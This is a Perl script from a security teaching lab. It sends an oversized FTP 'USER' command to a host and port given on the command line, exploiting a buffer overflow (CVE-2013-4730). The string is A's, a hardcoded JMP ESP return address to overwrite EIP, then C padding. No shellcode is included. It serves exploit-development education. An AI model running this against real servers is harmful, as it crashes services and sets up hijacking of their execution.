#!/usr/bin/perl

# - As a condition of your use of this Web site and Code, you warrant to computersecuritystudent.com
#   that you will not use this Web site or Code for any purpose that is unlawful or that is
#   prohibited by these terms, conditions, and notices.
# - In accordance with UCC § 2-316, this product is provided with "no warranties, either express or
#   implied." The information contained is provided "as-is", with "no guarantee of merchantability."
# - In addition, this is a teaching website that does not condone malicious behavior of any kind.
# - You are on notice, that continuing and/or using this lab and code outside your "own" test
#   environment is considered malicious and is against the law.
# - © 2016 No content replication of any kind is allowed without express written permission.
# - Authors: @bobmitch2311 and @HKD_student

# Creates an IO::Socket::INET object interface
use IO::Socket;

chomp($IPADDRESS        = $ARGV[0]);
chomp($PORT             = $ARGV[1]);
chomp($COUNT		= $ARGV[2]);

if(($IPADDRESS eq "")||($PORT eq "")||($COUNT eq ""))
{
        print "Help Usage\n";
        print "------------------------------------------------\n";
        print "$0 <IPADDRESS> <PORT> <FUZZER_COUNT>\n";
        print "------------------------------------------------\n";
        print "E.g., $0 192.168.2.106 21 3000\n";
        exit;
}

# FTP Links
# https://www.ietf.org/rfc/rfc959.txt
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4730
# Per CVE-2013-4730 and RFC will fuzz the USER variable that does
# need to contain a <space> after the string (USER)
# E.g., (USER )
$header 	= "USER ";

# Create a string of many A's
# The Hexidecimal for A is (x41)
# E.g., 2001 AAAAAA....AAAA's
# This is the OFFSET we were provided from pattern_create.rb
# E.g., /usr/share/metasploit-framework/tools/pattern_create.rb 2007

$junk 		= "\x41" x $COUNT;

# 1) The EIP is a special register that points to the instruction 
#    that will be executed next.
# 2) If we can write 4 B's into this special register, then we can 
#    potential control what happens next

# JMP ESP
# Replace the 4 BBBB's with the JMP ESP Register
# Bit and Byte Order x86 is little-endian. In illustrations of data structures 
# in memory, smaller addresses appear toward the bottom of the figure; addresses 
# increase toward the top. Bit positions are numbered from right to left. The numerical 
# value of a set bit is equal to two raised to the power of the bit position. 
# IA-32 processors are “little endian” machines; this means the bytes of a word are 
# numbered starting from the least significant byte

$eip    	= "\xD7\x30\x9D\x7C";

# Create a lot of C's after the 4 B's to show virtual line of demarcation
# between the 2000+ A's, the 4 B's, and the 500 C's
$padding	= "\x43" x 500;

# Create a fuzzing string that looks like
# USER AAAA(2000+)AAAA|D7309D7C|CCCC(500)CCCCC
$string 	= $header.$junk.$eip.$padding;

# Create A Socket to an IPADDRESS over a PORT using the TCP Protocol
$socket = IO::Socket::INET->new(PeerAddr => "$IPADDRESS",PeerPort => "$PORT",Proto => "tcp");

# Send the fuzzing string of
# E.g., USER AAAA(2000+)AAAA|EIP(-->D7309D7C)|CCCC(500)CCCCC
print $socket $string;
print "===> [Sending USER AAAA($COUNT)AAAA|EIP(D7309D7C)|CCCC(500)CCCCC]\n";

# Close Socket
close($socket);

